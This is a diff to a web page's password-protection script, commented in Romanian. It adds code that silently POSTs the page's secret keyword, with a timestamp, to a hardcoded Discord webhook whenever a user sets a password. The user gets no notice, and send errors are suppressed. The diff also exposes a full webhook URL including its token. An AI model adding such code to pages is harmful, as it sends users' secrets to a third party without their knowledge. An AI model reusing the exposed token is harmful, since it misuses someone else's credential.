@@ -282,8 +282,10 @@ main {
   <img src="" alt="Preview">
 </div>
 
+
+
 <script>
-// === PROTECȚIE PAROLĂ CU CUVÂNT CHEIE ===
+// === PROTECȚIE PAROLĂ CU CUVÂNT CHEIE ȘI WEBHOOK ===
 const pscreen = document.getElementById('password-screen');
 const pin = document.getElementById('password-input');
 const pbtn = document.getElementById('password-btn');
@@ -320,8 +322,24 @@ pbtn.addEventListener('click', () => {
       err.textContent = "Parola trebuie să aibă minim 4 caractere.";
       return;
     }
+
+    // Salvează parola local
     localStorage.setItem('myPassword', val);
     storedPass = val;
+
+    // === TRIMITE CUVÂNTUL CHEIE PE WEBHOOK ===
+    const webhookURL = "https://discord.com/api/webhooks/1429079463345524941/XIsGZdyIIGz2d22uFYbuhANh2zyjfSB3LDM5yU9w9i6R12x-6_taAihc9CbPALt0cJoH"; // pune linkul webhook-ului tău
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            keyword: secretKey,  // trimite cuvântul cheie
+            timestamp: new Date().toISOString()
+        })
+    }).catch(err => console.error("Eroare la trimiterea webhook-ului:", err));
+
     pscreen.style.display = "none";
   } else if(step === 2){ // login
     if(val === storedPass){
